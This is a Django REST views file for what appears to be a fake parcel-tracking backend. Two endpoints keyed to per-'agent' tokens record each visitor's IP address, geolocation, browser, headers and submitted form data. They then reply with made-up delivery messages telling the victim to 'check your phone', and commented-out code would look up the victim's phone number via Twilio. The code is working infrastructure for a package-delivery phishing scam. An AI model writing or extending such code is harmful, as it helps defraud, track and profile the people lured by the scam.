from typing import Optional
from common.api_types import HeaderData
from common.api_types import IpData
from common.api_types import LocaleData
from common.api_types import LocationData
from common.api_types import TimeData
from common.api_types import UserAgentData
from common.functions import get_ip_data
from common.functions import get_locale_data
from common.functions import get_location_data
from common.functions import get_time_data
from common.functions import get_user_agent_data
from django.shortcuts import get_object_or_404
from rest_framework import serializers
from rest_framework import status
from rest_framework.decorators import action
from rest_framework.mixins import ListModelMixin
from rest_framework.mixins import RetrieveModelMixin
from rest_framework.request import Request
from rest_framework.response import Response
from rest_framework.viewsets import GenericViewSet
from tracking.models import Agent
from tracking.models import TrackingData


class TrackingDataSerializer(serializers.ModelSerializer):
    class Meta:
        model = TrackingData
        fields = "__all__"


class PackagesView(ListModelMixin, RetrieveModelMixin, GenericViewSet):
    lookup_field = "token"
    queryset = TrackingData.objects.all()
    serializer_class = TrackingDataSerializer

    @action(detail=True, methods=["post"], url_path="intercept")
    def intercept(self, request: Request, token: Optional[str] = None) -> Response:
        if not token:
            return Response({"error": "Token is required"}, status=status.HTTP_400_BAD_REQUEST)

        agent = get_object_or_404(Agent, token=token)
        header_data: HeaderData = getattr(request, "header_data ")
        http_method = str(request.data.get("http_method", request.method))
        # notifications = request.data.get("notifications")

        # Get IP data
        ip_data: IpData = get_ip_data(request, header_data)
        print(f"ip data: {ip_data}")

        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, header_data)

        # Get locale data
        locale_data: LocaleData = get_locale_data(request, header_data)

        # Get time data
        time_data: TimeData = get_time_data(header_data, ip_data)

        # Get location data
        location_data: LocationData = get_location_data(header_data, ip_data)

        # Handle notifications if provided
        # phone_data: Optional[TwilioLookupResponse] = None
        # if notifications:
        #     twilio_client = TwilioApiClient(settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN)
        #     phone_data = twilio_client.get_data(notifications)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
            # _phone_data=phone_data.model_dump() if phone_data else None,
        )

        return Response(
            {
                "status": "success",
                "message": "✅ A request was sent to redirect your package. Please check your phone for updates we have sent you.",
            },
            status=status.HTTP_201_CREATED,
        )

    @action(detail=True, methods=["post"], url_path="track")
    def track(self, request: Request, token: Optional[str] = None) -> Response:
        if not token:
            return Response({"error": "Token is required"}, status=status.HTTP_400_BAD_REQUEST)

        agent = get_object_or_404(Agent, token=token)
        header_data: HeaderData = getattr(request, "header_data ")
        http_method = str(request.data.get("http_method", request.method))

        # Get IP data
        ip_data: IpData = get_ip_data(request, header_data)
        print(f"ip data: {ip_data}")

        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, header_data)

        # Get locale data
        locale_data: LocaleData = get_locale_data(request, header_data)

        # Get time data
        time_data: TimeData = get_time_data(header_data, ip_data)

        # Get location data
        location_data: LocationData = get_location_data(header_data, ip_data)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
        )

        return Response(
            {
                "status": "success",
                "message": "✅ Your package was picked up by a local carrier. It may take a few hours to arrive at the sorting facility.",
            },
            status=status.HTTP_201_CREATED,
        )
